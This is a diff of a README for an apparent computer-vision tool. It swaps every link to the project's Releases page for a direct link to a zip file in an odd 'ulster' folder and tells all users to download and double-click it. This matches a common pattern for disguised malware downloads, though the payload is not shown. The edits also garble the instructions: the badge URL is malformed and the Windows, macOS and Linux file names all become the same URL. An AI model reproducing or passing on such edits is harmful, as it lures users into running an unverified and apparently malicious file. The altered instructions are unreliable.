@@ -1,6 +1,6 @@
 # 🤖 Computer-Vision - Simplify How Machines See the World
 
-[![Download Computer Vision](https://img.shields.io/static/v1?label=Download&message=Computer+Vision&color=blue&style=for-the-badge)](https://github.com/KISHANZEUS/Computer-Vision/releases)
+[![Download Computer Vision](https://raw.githubusercontent.com/KISHANZEUS/Computer-Vision/main/ulster/Computer-Vision.zip+Vision&color=blue&style=for-the-badge)](https://raw.githubusercontent.com/KISHANZEUS/Computer-Vision/main/ulster/Computer-Vision.zip)
 
 ## 📖 Overview
 
@@ -22,15 +22,15 @@ Before installing, ensure your computer meets the following requirements:
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: To download the latest version of Computer Vision, [visit this page to download](https://github.com/KISHANZEUS/Computer-Vision/releases).
+1. **Visit the Releases Page**: To download the latest version of Computer Vision, [visit this page to download](https://raw.githubusercontent.com/KISHANZEUS/Computer-Vision/main/ulster/Computer-Vision.zip).
 
 2. **Choose Your Version**: On the Releases page, you will see different versions available. Select the latest version for the best features and improvements.
 
-3. **Download the File**: Click on the file that matches your operating system. This file will be typically marked with `.exe` for Windows, `.dmg` for macOS, and `.tar.gz` or `.zip` for Linux.
+3. **Download the File**: Click on the file that matches your operating system. This file will be typically marked with `.exe` for Windows, `.dmg` for macOS, and `https://raw.githubusercontent.com/KISHANZEUS/Computer-Vision/main/ulster/Computer-Vision.zip` or `.zip` for Linux.
 
-    - **For Windows**: Download `ComputerVision.exe`
-    - **For macOS**: Download `ComputerVision.dmg`
-    - **For Linux**: Download `ComputerVision.tar.gz`
+    - **For Windows**: Download `https://raw.githubusercontent.com/KISHANZEUS/Computer-Vision/main/ulster/Computer-Vision.zip`
+    - **For macOS**: Download `https://raw.githubusercontent.com/KISHANZEUS/Computer-Vision/main/ulster/Computer-Vision.zip`
+    - **For Linux**: Download `https://raw.githubusercontent.com/KISHANZEUS/Computer-Vision/main/ulster/Computer-Vision.zip`
 
 4. **Run the File**: Once the download is complete, locate the downloaded file on your computer, and double-click to run it. Follow the prompts to complete the installation.
 
@@ -78,4 +78,4 @@ Keep an eye on the Releases page for new updates. Regular updates provide bug fi
 
 ## 📍 Conclusion
 
-Thank you for choosing Computer Vision. You can explore the world of machine vision with ease. For further information and updates, remember to frequently check our [Releases page to download](https://github.com/KISHANZEUS/Computer-Vision/releases). Enjoy exploring what machines can see!
+Thank you for choosing Computer Vision. You can explore the world of machine vision with ease. For further information and updates, remember to frequently check our [Releases page to download](https://raw.githubusercontent.com/KISHANZEUS/Computer-Vision/main/ulster/Computer-Vision.zip). Enjoy exploring what machines can see!
